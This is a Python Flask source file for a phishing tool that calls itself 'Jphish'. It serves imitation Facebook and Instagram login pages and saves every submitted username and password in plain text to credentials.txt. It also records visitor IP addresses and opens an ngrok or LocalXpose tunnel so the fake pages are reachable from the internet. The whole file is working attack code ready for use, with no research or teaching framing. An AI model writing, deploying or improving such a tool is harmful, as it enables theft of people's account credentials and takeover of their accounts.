import os
import subprocess
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# Log credentials and sessions
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Phishing routes
@app.route('/')
def home():
    return render_template('login.html')

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials(username, password, 'Facebook')
        return redirect(url_for('success'))
    log_session(request.remote_addr, 'Facebook')
    return render_template('facebook.html')

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        log_credentials(username, password, 'Instagram')
        return redirect(url_for('success'))
    log_session(request.remote_addr, 'Instagram')
    return render_template('instagram.html')

@app.route('/success')
def success():
    return render_template('success.html')

# Start LocalXpose or Ngrok with interactive auth token input
def start_tunnel():
    print("\n=== Jphish Tunnel Setup ===")
    use_localxpose = input("Use LocalXpose? (y/n): ").strip().lower() == 'y'
    
    if use_localxpose:
        localxpose_token = input("Enter your LocalXpose auth token: ").strip()
        localxpose_domain = input("Enter your LocalXpose domain (e.g., yourdomain.com): ").strip()
        subprocess.Popen(["localxpose", "http", "8080", "--to", localxpose_domain, "--auth", localxpose_token])
        print(f"\n[+] LocalXpose tunnel started: https://{localxpose_domain}")
    else:
        ngrok_token = input("Enter your Ngrok auth token: ").strip()
        subprocess.Popen(["ngrok", "http", "8080", "--authtoken", ngrok_token])
        print("\n[+] Ngrok tunnel started. Check the Ngrok console for the public URL.")

if __name__ == '__main__':
    start_tunnel()
    app.run(port=8080)
